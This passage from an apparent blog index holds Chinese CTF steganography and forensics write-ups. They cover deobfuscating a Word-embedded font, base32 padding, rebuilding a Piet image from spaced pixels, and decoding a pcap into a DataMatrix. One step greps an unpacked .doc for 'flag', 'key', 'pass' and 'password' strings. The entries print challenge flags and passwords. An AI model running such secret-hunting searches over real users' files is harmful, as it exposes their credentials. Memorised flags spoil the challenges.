class="line">DASCTF&#123;F1rst_parT_1s_herE_&amp;&amp;_SeconD_paRt_is_B1nArY_&amp;&amp;_Th1rD_PArT_qRc0De&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 提取像素点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提取像素点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[HNCTF 2022 WEEK2]calligraphy</title>
      <link href="/posts/13727.html"/>
      <url>/posts/13727.html</url>
      
        <content type="html"><![CDATA[<h1 id="HNCTF-2022-WEEK2-calligraphy"><a href="#HNCTF-2022-WEEK2-calligraphy" class="headerlink" title="[HNCTF 2022 WEEK2]calligraphy"></a>[HNCTF 2022 WEEK2]calligraphy</h1><h2 id="复现流程："><a href="#复现流程：" class="headerlink" title="复现流程："></a>复现流程：</h2><ol><li>打开word，出现这个，复制一下，粘贴出来是<code>! &quot;#$%flag is not here~~</code>，所以说明这个字体肯定被修改过了。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230114163606411.png" alt="image-20230114163606411"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230114163634525.png" alt="image-20230114163634525"></p><br><ol start="2"><li>改后缀名为zip，解压压缩包，打开<code>/word/fontTable.xml</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230114163757128.png" alt="image-20230114163757128"></p><p>可以得到font-name为<code>flag Mono</code>，fontKey为<code>&#123;1F513ACE-F8AD-4F84-9264-C7B38E1D8CB7&#125;</code></p><br><ol start="3"><li>根据我们得到的fontKey，我们将我们的 <code>word/fonts/font2.odttf</code> 重命名为 <code>1F513ACE-F8AD-4F84-9264-C7B38E1D8CB7.odttf</code></li></ol><p>打开odttf转换ttf网站：<a href="https://somanchiu.github.io/odttf2ttf/js/demo%EF%BC%8C%E4%B8%8A%E4%BC%A0%E6%94%B9%E8%BF%87%E5%90%8D%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8E%E5%B0%B1%E4%BC%9A%E8%87%AA%E5%8A%A8%E4%B8%8B%E8%BD%BDttf%E5%AD%97%E4%BD%93%E6%96%87%E4%BB%B6%E4%BA%86%E3%80%82">https://somanchiu.github.io/odttf2ttf/js/demo，上传改过名的文件后就会自动下载ttf字体文件了。</a></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230114164122107.png" alt="image-20230114164122107"></p><p>这一步也可以使用python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">odttf_name = <span class="string">&quot;./1F513ACE-F8AD-4F84-9264-C7B38E1D8CB7.odttf&quot;</span></span><br><span class="line">odttf_path = os.path.abspath(odttf_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(odttf_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取文件名</span></span><br><span class="line">file_name = os.path.splitext(odttf_path)[<span class="number">0</span>].split(<span class="string">&quot;\\&quot;</span>)[-<span class="number">1</span>].replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取key</span></span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(file_name), <span class="number">0</span>, -<span class="number">2</span>):</span><br><span class="line">    key.append(<span class="built_in">int</span>(file_name[i-<span class="number">2</span>:i], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./font2.ttf&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        f.write(<span class="built_in">bytes</span>([data[i] ^ key[i % <span class="built_in">len</span>(key)]]))</span><br><span class="line">    f.write(data[<span class="number">32</span>:])</span><br></pre></td></tr></table></figure><br><ol start="4"><li>使用<a href="https://fontdrop.info/#/?darkmode=true">在线网站FontDrop</a>，拖到上传框中，得到flag。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230114165411570.png" alt="image-20230114165411570"></p><p><strong>NSSCTF{How_ug1Y_f0Nt}</strong></p><br><h2 id="题目补充："><a href="#题目补充：" class="headerlink" title="题目补充："></a>题目补充：</h2><p><strong>关于odttf转ttf脚本原理：</strong></p><p>首先将<code>1F513ACE-F8AD-4F84-9264-C7B38E1D8CB7.odttf</code>，得到文件名<code>1F513ACE-F8AD-4F84-9264-C7B38E1D8CB7</code></p><p>再将文件名去掉<code>-</code>，得到<code>1F513ACEF8AD4F849264C7B38E1D8CB7</code></p><p>再将1字节为一组进行反序，得到key是：<code>B78C1D8EB3C76492844FADF8CE3A511F</code></p><p>最后再对odttf文件的前32字节进行异或，密钥就是16字节的<code>B78C1D8EB3C76492844FADF8CE3A511F</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Base32补全原理（以及代码）</title>
      <link href="/posts/3882.html"/>
      <url>/posts/3882.html</url>
      
        <content type="html"><![CDATA[<h1 id="补全原理"><a href="#补全原理" class="headerlink" title="补全原理"></a>补全原理</h1><p>base32编码后的字符串，每8字节一组。</p><hr><p>例子：（下面的base32编码后的字符串都没有 <code>=</code> 符号）</p><table><thead><tr><th>编码后</th><th>len</th><th>补全几个 <code>=</code> 符号</th><th>补全后</th><th>解码后</th></tr></thead><tbody><tr><td>NA</td><td>2</td><td>8 - (2 % 8) &#x3D; 6</td><td>NA&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</td><td>h</td></tr><tr><td>NBSQ</td><td>4</td><td>8 - (4 % 8) &#x3D; 4</td><td>NBSQ&#x3D;&#x3D;&#x3D;&#x3D;</td><td>he</td></tr><tr><td>NBSWY</td><td>5</td><td>8 - (5 % 8) &#x3D; 3</td><td>NBSWY&#x3D;&#x3D;&#x3D;</td><td>hel</td></tr><tr><td>NBSWY3A</td><td>7</td><td>8 - (7 % 8) &#x3D;&#x3D; 1</td><td>NBSWY3A&#x3D;</td><td>hell</td></tr><tr><td>NBSWY3DP</td><td>8</td><td>8 % 8 &#x3D;&#x3D; 0，所以不需要补</td><td>NBSWY3DP</td><td>hello</td></tr></tbody></table><p>代码逻辑：</p><ul><li>1.先用 <code>len % 8</code> 如果等于0，就说明不需要补<code>=</code></li><li>2.<code>len % 8</code> 不等于0，就说明需要补<code>=</code>，末尾补全 <code>8 - (len % 8)</code> 位 <code>=</code></li></ul><hr><p>Python代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="string">&quot;NA&quot;</span>, <span class="string">&quot;NBSQ&quot;</span>, <span class="string">&quot;NBSWY&quot;</span>, <span class="string">&quot;NBSWY3A&quot;</span>, <span class="string">&quot;NBSWY3DP&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">    missing_padding = <span class="built_in">len</span>(line) % <span class="number">8</span></span><br><span class="line">    <span class="keyword">if</span> missing_padding != <span class="number">0</span>:</span><br><span class="line">        line += <span class="string">&quot;=&quot;</span> * (<span class="number">8</span> - missing_padding)</span><br><span class="line">    <span class="built_in">print</span>(line)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">运行结果：</span><br><span class="line">NA======</span><br><span class="line">NBSQ====</span><br><span class="line">NBSWY===</span><br><span class="line">NBSWY3A=</span><br><span class="line">NBSWY3DP</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Base系列补全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base系列补全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提取图片间隔像素（以及代码）</title>
      <link href="/posts/24591.html"/>
      <url>/posts/24591.html</url>
      
        <content type="html"><![CDATA[<ol><li>哪里的题目不知道，群里面看到的</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230131195727270.png" alt="image-20230131195727270"></p><ol start="2"><li>这种一看就知道要提取像素点，然后构成新的图片，代码如下：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入文件名称&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入左上顶点和右下顶点坐标 (如:220x344+3520x2150)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-n&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入宽度间隔和高度间隔 (如:44x86)&#x27;</span>)</span><br><span class="line">args  = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;\+\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.p) <span class="keyword">and</span> re.search(<span class="string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.n):</span><br><span class="line">        x1, y1 = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.p.split(<span class="string">&quot;+&quot;</span>)[<span class="number">0</span>].split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        x2, y2 = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.p.split(<span class="string">&quot;+&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        width, height = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.n.split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line"></span><br><span class="line">        img_path = os.path.abspath(args.f)</span><br><span class="line">        file_name = img_path.split(<span class="string">&quot;\\&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        img = cv2.imread(img_path, cv2.IMREAD_COLOR)</span><br><span class="line">        row, col = img.shape[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">        r, c = <span class="built_in">len</span>(<span class="built_in">range</span>(y1, y2 + <span class="number">1</span>, height)), <span class="built_in">len</span>(<span class="built_in">range</span>(x1, x2 + <span class="number">1</span>, width))</span><br><span class="line">        new_img = np.zeros(shape=(r, c, <span class="number">3</span>))</span><br><span class="line">        <span class="keyword">for</span> y, x <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(r), <span class="built_in">range</span>(c)):</span><br><span class="line">            new_img[y, x] = img[y1 + y * height, x1 + x * width]</span><br><span class="line"></span><br><span class="line">        cv2.imwrite(<span class="string">f&quot;_<span class="subst">&#123;file_name&#125;</span>&quot;</span>, new_img)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;已保存到运行目录中...&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;参数-p或参数-n, 输入错误!&quot;</span>)</span><br></pre></td></tr></table></figure><ol start="3"><li>使用教程如下，你需要得到左上顶点和右下顶点，还有宽度和高度的间隔</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230131195805305.png" alt="image-20230131195805305"></p><p>使用ps打开图片鼠标放在这个左上顶点位置按一下F8，就可以看到坐标了<code>220x344</code><br>同理得到右下顶点位置<code>3520x2150</code><br>得到：<code>220x344+3520x2150</code></p><ol start="4"><li>鼠标放在这个位置，也就是x轴的第二点的位置，得到<code>x=264</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230131195832625.png" alt="image-20230131195832625"></p><p>得到<code>宽度 = 264 - 220 = 44</code>，220是之前第一个点的x轴坐标，也就是说我现在计算间隔多少像素宽度。<br>同理也可以计算出来<code>高度 = 430 - 344 = 86</code>，组合起来为<code>44x86</code>。</p><ol start="5"><li>现在开始使用脚本<br>上面操作后得到了两个信息：<code>220x344+3520x2150</code>，<code>44x86</code><br>代码命令：<code>python .\main.py -f .\flag.png -p 220x344+3520x2150 -n 44x86</code><br>运行截图如下：</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230131195854810.png" alt="image-20230131195854810"></p><ol start="6"><li>得到的图片如下，这么多色彩，大概率是piet，<a href="https://baike.baidu.com/item/Piet/10859049?fr=aladdin">百度百科</a>。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230131195916164.png" alt="image-20230131195916164"></p><p>piet一个古老的编程语言，可以找个在线网站<a href="https://so.csdn.net/so/search?q=%E8%A7%A3%E9%87%8A%E5%99%A8&spm=1001.2101.3001.7020">解释器</a>运行一下<br>在线网站：<a href="https://www.bertnase.de/npiet/npiet-execute.php">https://www.bertnase.de/npiet/npiet-execute.php</a><br>运行截图：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230131195930368.png" alt="image-20230131195930368"></p><p><strong>flag{f05bcd8a-6893-4e01-b5ef-e311aaa99fe9}</strong></p>]]></content>
      
      
      <categories>
          
          <category> 提取像素点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提取像素点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF-[CISCN 2022 东北]：听说这是一个二维码</title>
      <link href="/posts/28924.html"/>
      <url>/posts/28924.html</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN-2022-东北-听说这是一个二维码"><a href="#CISCN-2022-东北-听说这是一个二维码" class="headerlink" title="[CISCN 2022 东北]听说这是一个二维码"></a>[CISCN 2022 东北]听说这是一个二维码</h1><p>复现过程如下：</p><ol><li>首先解压得到<code>二维码.wav</code>，使用<code>010editor</code>打开。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221203223508136.png" alt="image-20221203223508136"></p><br><ol start="2"><li>尾部的base64复制一下，使用<code>CyberChef</code>解码</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221203223556118.png" alt="image-20221203223556118"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hello boy </span><br><span class="line"> Congratulations on finding the password of this song. Do you know how to unlock this song.</span><br><span class="line">Sound from deep</span><br><span class="line">VGhpc0k1UGFzc3cwcmQ=</span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221203223753628.png" alt="image-20221203223753628"></p><p>得到密码：<code>ThisI5Passw0rd</code></p><p>Sound from deep –&gt; <code>来自深处的声音</code>，想到工具<code>DeepSound</code>，拖到工具中，提示输入密码，密码为<code>ThisI5Passw0rd</code></p><br><ol start="3"><li>将隐写的<code>flag.pcap</code>提取出来，如下图：</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221203223854423.png" alt="image-20221203223854423"></p><br><ol start="4"><li>打开<code>flag.pcap</code>，观察了一下，只有这个地方变化最明显，这个是发送的ip地址</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221203223953199.png" alt="image-20221203223953199"></p><p>0和255，可以代表0或者1，所以写个代码，提取一下所有的ip，然后得到二进制字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"></span><br><span class="line">cap = pyshark.FileCapture(<span class="string">&quot;./flag.pcap&quot;</span>)</span><br><span class="line"></span><br><span class="line">bin_str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cap:</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">bin</span> := c.ip.dst_host.split(<span class="string">&quot;.&quot;</span>)[-<span class="number">2</span>]) == <span class="string">&quot;0&quot;</span>:</span><br><span class="line">        bin_str += <span class="built_in">bin</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">bin</span> == <span class="string">&quot;255&quot;</span>:</span><br><span class="line">        bin_str += <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(bin_str)</span><br></pre></td></tr></table></figure><p>运行后，得到<code>flag.txt</code>，现在是2进制转图片了，这一步毕竟简单，实现代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入文件名称&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-size&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">5</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;图片放大倍数(默认5倍)&#x27;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">file_path = os.path.join(args.f)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;./out&quot;</span>):</span><br><span class="line">    os.mkdir(<span class="string">&quot;./out&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read binary txt</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_QR</span>(<span class="params">img, reverse=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(data[:row*col]):</span><br><span class="line">        right_bottom_point = (left_top_point[i][<span class="number">0</span>] + size, left_top_point[i][<span class="number">1</span>] + size)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> reverse:</span><br><span class="line">            cv2.rectangle(img, left_top_point[i], right_bottom_point, color=(</span><br><span class="line">                <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>), thickness=-<span class="number">1</span>) <span class="keyword">if</span> v == <span class="string">&quot;0&quot;</span> <span class="keyword">else</span> cv2.rectangle(img, left_top_point[i], right_bottom_point, color=(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>), thickness=-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cv2.rectangle(img, left_top_point[i], right_bottom_point, color=(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>), thickness=-<span class="number">1</span>) <span class="keyword">if</span> v == <span class="string">&quot;0&quot;</span> <span class="keyword">else</span> cv2.rectangle(</span><br><span class="line">                img, left_top_point[i], right_bottom_point, color=(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>), thickness=-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 计算宽高</span></span><br><span class="line">    dic = &#123;X: <span class="built_in">int</span>(<span class="built_in">len</span>(data) / X) <span class="keyword">for</span> X <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(data)) <span class="keyword">if</span> <span class="built_in">len</span>(data) % X == <span class="number">0</span>&#125;</span><br><span class="line">    size = args.size</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> row, col <span class="keyword">in</span> dic.items():</span><br><span class="line">        img1, img2 = np.zeros((row * size, col * size, <span class="number">1</span>)), np.zeros((row * size, col * size, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">        left_top_point = []</span><br><span class="line">        <span class="keyword">for</span> i, j <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(<span class="number">0</span>, row * size, size), <span class="built_in">range</span>(<span class="number">0</span>, col * size, size)):</span><br><span class="line">            left_top = (j, i)</span><br><span class="line">            left_top_point.append(left_top)</span><br><span class="line"></span><br><span class="line">        cv2.imwrite(<span class="string">f&quot;./out/<span class="subst">&#123;col&#125;</span>_<span class="subst">&#123;row&#125;</span>.png&quot;</span>, draw_QR(img1, reverse=<span class="literal">False</span>))</span><br><span class="line">        cv2.imwrite(<span class="string">f&quot;./out/<span class="subst">&#123;col&#125;</span>_<span class="subst">&#123;row&#125;</span>_reverse.png&quot;</span>, draw_QR(img2, reverse=<span class="literal">True</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] 宽度:<span class="subst">&#123;col:<span class="number">6</span>&#125;</span> 高度:<span class="subst">&#123;row:<span class="number">6</span>&#125;</span>, 已保存在运行目录out中...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 已经遍历完所有情况, 即将自动关闭!&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure><p>运行效果：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221203224437851.png" alt="image-20221203224437851"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221203224457024.png" alt="image-20221203224457024"></p><p>可以看到这两个，<code>132_132_reverse.png</code>比较像<code>DataMatrix</code>，使用在线网站：<a href="https://demo.dynamsoft.com/barcode-reader/?ref=www.hackjie.com">戳我打开！</a></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221203224655098.png" alt="image-20221203224655098"></p><p><strong>flag{c736863427be5671102c039d43f0c75b}</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF-[长城杯 2022]：办公室爱情</title>
      <link href="/posts/19898.html"/>
      <url>/posts/19898.html</url>
      
        <content type="html"><![CDATA[<h1 id="长城杯-2022-办公室爱情"><a href="#长城杯-2022-办公室爱情" class="headerlink" title="[长城杯 2022]办公室爱情"></a>[长城杯 2022]办公室爱情</h1><p><strong>复现过程如下：</strong></p><ol><li><p>先把<code>沃德.doc</code>复制到kali中，修改后缀名后为<code>沃德.zip</code>，然后解压文件。</p></li><li><p>使用grep进行匹配</p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -irE &quot;flag|==|10210897103|666c6167|464C4147|Zmxh|Wm14aFoz|&amp;#102|58s4vb|2uk2h3|key|pass|pwd|password&quot; --binary-files=without-match *</span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221203211951687.png" alt="image-20221203211951687"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221203212040449.png" alt="image-20221203212040449"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password1:True_lOve_</span><br><span class="line">password12:i2_supReMe</span><br></pre></td></tr></table></figure><p>得到password: <code>True_lOve_i2_supReMe</code></p><br><ol start="3"><li>使用<code>010editor</code>打开<code>皮迪符.pdf</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221203212249612.png" alt="image-20221203212249612"></p><p>明显看到<code>20 09 0D</code>特征，你往下面滑动的话，还能看见这种特征，这就是<code>wbStego4</code>隐写，下面的图片是我之前写的总结（注明：我并不知道隐写的流程，不保证正确）</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221203212421207.png" alt="image-20221203212421207"></p><br><ol start="4"><li>使用<code>wbStego4</code>，密码为上一步的<code>True_lOve_i2_supReMe</code>。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221203212630063.png" alt="image-20221203212630063"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221203212639706.png" alt="image-20221203212639706"></p><p>得到密码<code>this_is_pAssw0rd@!</code></p><br><ol 